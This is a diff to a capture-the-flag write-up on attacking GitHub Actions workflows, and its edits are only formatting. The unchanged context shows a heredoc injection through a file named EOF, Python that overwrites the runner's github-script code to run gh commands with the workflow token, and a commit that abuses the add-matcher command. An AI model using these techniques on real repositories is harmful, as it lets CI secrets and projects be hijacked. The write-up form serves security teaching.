@@ -12,7 +12,7 @@ that are commonly found in real-world GHA configurations.
 We're presented with a private GitHub repo with a GitHub actions secret named
 `flag` (which is the challenge flag) with the following layout:
 
-```console-out
+```plaintext
 .
 ├── .github
 │   └── workflows
@@ -127,7 +127,7 @@ by GitHub's own GHA CodeQL ruleset. [^4]
 
 And indeed, with the correct repository tree, we can trigger the injection:
 
-```console-out
+```plaintext
 ├── AAA
 ├── docker
 │   └── Dockerfile
@@ -149,7 +149,7 @@ And indeed, with the correct repository tree, we can trigger the injection:
 
 Resulting in the following ordering in the inclusion in the heredoc:
 
-```console-out
+```plaintext
 $ git diff --name-only 00dcde8c33f66d8bacf1512f567d23ceb7b988c2
 AAA
 EOF
@@ -229,21 +229,21 @@ with open("changed-files.txt", "w") as f:
 with open("/home/runner/work/_actions/actions/github-script/v7/dist/index.js", "w") as f:
     f.write("""
 process.env.GH_TOKEN = process.env['INPUT_GITHUB-TOKEN'];
-            
+
 const { execSync } = require('child_process');
-            
+
 let output = execSync('gh label create flag --repo kontinuerlig-chal/KONTINUERLIG-msanft --color "d73a4a" --description flag', { encoding: 'utf-8' });
 console.log(output);
 output = execSync('gh label create reviewed --repo kontinuerlig-chal/KONTINUERLIG-msanft --color "d73a4a" --description reviewed', { encoding: 'utf-8' });
 console.log(output);
-            
+
 // output = execSync('gh pr edit --add-label "reviewed" --repo kontinuerlig-chal/KONTINUERLIG-msanft 2', { encoding: 'utf-8' });
 // console.log(output);
 
 // output = execSync('gh pr edit --add-label "flag" --repo kontinuerlig-chal/KONTINUERLIG-msanft 3', { encoding: 'utf-8' });
 // console.log(output);
 """)
-    
+
 def dumps(obj, **kwargs):
     return '[]'
 ```
@@ -266,6 +266,8 @@ In the `prerelease.yml` workflow, the Dockerfile is being built with the `conten
 FROM alpine
 RUN echo "You'll need to assemble the build yourself"
 ```
+
+---
 
 ```yaml
 # prerelease.yml
@@ -416,7 +418,7 @@ with open("/tmp/foo/test.json", "w") as f:
             ]
         }
     ]
-}         
+}
 """)
 
 os.system("cd /tmp/foo; git add test.json; git commit -m '::add-matcher::test.json'; git push origin main")
